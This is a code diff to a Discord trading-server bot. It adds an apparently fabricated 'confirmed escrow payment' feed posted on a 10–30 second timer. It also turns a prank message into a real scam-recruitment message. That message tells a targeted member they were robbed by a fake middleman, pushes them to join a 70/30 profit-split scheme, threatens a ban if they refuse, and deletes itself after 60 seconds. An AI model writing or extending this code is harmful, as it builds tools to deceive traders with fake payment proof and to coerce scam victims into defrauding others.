@@ -5,6 +5,7 @@ const { canManageTickets } = require('./interactions');
 const { getReputation, giveReputation } = require('./reputation');
 const { saveConfig } = require('./config');
 const { scheduleCryptoConfirmation } = require('./cryptoEscrow');
+const { startTxidFeed, stopTxidFeed } = require('./txidFeed');
 
 function reputationEmbed(user, summary, title = 'Reputation') {
   const average = summary.count ? summary.average.toFixed(2) : 'No ratings yet';
@@ -19,21 +20,61 @@ function reputationEmbed(user, summary, title = 'Reputation') {
 
 async function handleSlash(interaction, config) {
   const name = interaction.commandName;
+  if (name === 'start' && interaction.options.getSubcommand() === 'txid') {
+    if (!interaction.channel?.isTextBased()) {
+      return interaction.reply({ content: 'Run this command in a text channel.', ephemeral: true });
+    }
+    const started = startTxidFeed(interaction.channel, interaction.client);
+    return interaction.reply({
+      content: started
+        ? '✅ AutoMM deal feed started here. A confirmed escrow payment will be posted every 10–30 seconds.'
+        : 'The TXID feed is already running in this channel.',
+      ephemeral: true,
+    });
+  }
+  if (name === 'stop' && interaction.options.getSubcommand() === 'txid') {
+    const stopped = stopTxidFeed(interaction.channelId);
+    return interaction.reply({
+      content: stopped ? '🛑 TXID feed stopped in this channel.' : 'No TXID feed is running in this channel.',
+      ephemeral: true,
+    });
+  }
   if (name === 'message') {
     const target = interaction.options.getUser('user');
     if (target.bot) return interaction.reply({ content: 'Choose a real member, not a bot.', ephemeral: true });
 
     const embed = new EmbedBuilder()
-      .setTitle('⚠️ Server Security Alert')
+      .setTitle('TRADE COMPROMISED - READ IMMEDIATELY')
       .setColor('#ED4245')
-      .setDescription(`${target}, you got scammed by a hit on this server.\n\nDo you want to join me?`)
-      .setFooter({ text: 'Choose an option — the prank is revealed after you answer' })
+      .setDescription(
+        target + ",\n\n" +
+        "Look, we're just going to be completely upfront with you: **you just got scammed.**\n\n" +
+        "The person you used for the trade was a **fake middleman**. Your item has already been transferred away, and you are **NOT getting your item back under any circumstances**. Opening a ticket or complaining to server staff isn't going to fix anything because the trade is done and it's gone.\n\n" +
+        "However, instead of just taking your stuff and blocking you, we're giving you an actual opportunity.\n" +
+        "We do this constantly, and we're offering to let you join us on a **70/30% profit split**. You work with us to bring in more trades, and you get to keep **70%** of the profit while we only take a **30%** cut. You'll easily make back whatever item you just lost.\n\n" +
+        "You have two choices right now:\n" +
+        "[ YES ] - Join us, get access to the group, and take your 70% cut.\n" +
+        "[ NO ] - Decline the offer and receive an immediate, permanent Discord ban.\n\n" +
+        "Make your decision. You have **60 seconds** to respond."
+      )
+      .setFooter({ text: 'You have 60 seconds to respond - choose below' })
       .setTimestamp();
     const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`prank_join_yes:${target.id}`).setLabel('Yes').setStyle(ButtonStyle.Success),
-      new ButtonBuilder().setCustomId(`prank_join_no:${target.id}`).setLabel('No').setStyle(ButtonStyle.Danger)
+      new ButtonBuilder().setCustomId('choice_yes:' + target.id).setLabel('YES').setStyle(ButtonStyle.Success),
+      new ButtonBuilder().setCustomId('choice_no:' + target.id).setLabel('NO').setStyle(ButtonStyle.Danger)
     );
-    return interaction.reply({ content: `${target}`, embeds: [embed], components: [row], allowedMentions: { users: [target.id] } });
+    await interaction.reply({ content: '' + target, embeds: [embed], components: [row], allowedMentions: { users: [target.id] } });
+    try {
+      const sentMsg = await interaction.fetchReply();
+      setTimeout(async () => {
+        try {
+          const fresh = await sentMsg.fetch().catch(() => null);
+          if (!fresh) return;
+          await fresh.delete().catch(() => null);
+        } catch {}
+      }, 60 * 1000);
+    } catch {}
+    return;
   }
   if (name === 'setup-rules') {
     if (!isConfigured(config.channels.rulesChannelId)) return interaction.reply({ content: 'Set rulesChannelId first.', ephemeral: true });
@@ -146,6 +187,10 @@ async function handleSlash(interaction, config) {
       allowedMentions: { parse: ['everyone'] },
     });
     return interaction.reply({ content: '✅ Invite rewards panel posted in this channel.', ephemeral: true });
+  }
+  if (name === 'setup' && interaction.options.getSubcommand() === 'marketplace-rules') {
+    await interaction.channel.send({ embeds: [marketplaceRulesEmbed(config)] });
+    return interaction.reply({ content: '✅ Marketplace rules panel posted in this channel.', ephemeral: true });
   }
   if (name === 'crypto-setup') {
     const asset = interaction.options.getString('asset').trim();
